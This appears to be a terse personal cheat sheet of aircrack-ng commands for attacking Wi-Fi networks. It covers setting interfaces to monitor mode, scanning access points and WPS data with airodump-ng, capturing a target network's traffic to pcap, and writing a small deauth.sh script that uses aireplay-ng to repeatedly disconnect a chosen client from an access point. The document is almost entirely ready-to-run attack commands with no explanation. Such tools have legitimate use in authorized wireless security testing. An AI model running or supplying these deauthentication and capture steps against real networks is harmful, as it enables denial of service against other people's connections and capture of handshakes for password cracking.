## General

```bash
1 apdo
2 sta
3 ap+sta
```

```bash
10 first seen
12 power rate
```

```bash
https://github.com/aircrack-ng/rtl8812au
```

```bash
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

ip link set wlan1 down
iw dev wlan1 set type monitor
ip link set wlan1 up
```

```bash
airodump-ng --manufacturer --beacons --showack --wps --uptime --band a wlan0
airodump-ng --manufacturer --beacons --showack --wps --uptime --band bg wlan0
```

```bash
airodump-ng --manufacturer --beacons --showack --wps --uptime \
            --band abg --bssid CHANGEME wlan1
```

```bash
airodump-ng --manufacturer --beacons --showack --wps --uptime \
            --write-interval 1 --output-format pcap --write CHANGEME \
            --channel CHANGEME --bssid CHANGEME wlan1
```

```bash
cat > deauth.sh << "EndOfMessage"
iwconfig wlan1 channel "${1}"

aireplay-ng -0 99 -D -a "${2}" -c "${3}" wlan1
EndOfMessage

chmod +x deauth.sh
```

```bash
kill -9 `ps aux | grep -i aircrack | awk '{print $2}'`
```

```bash

```
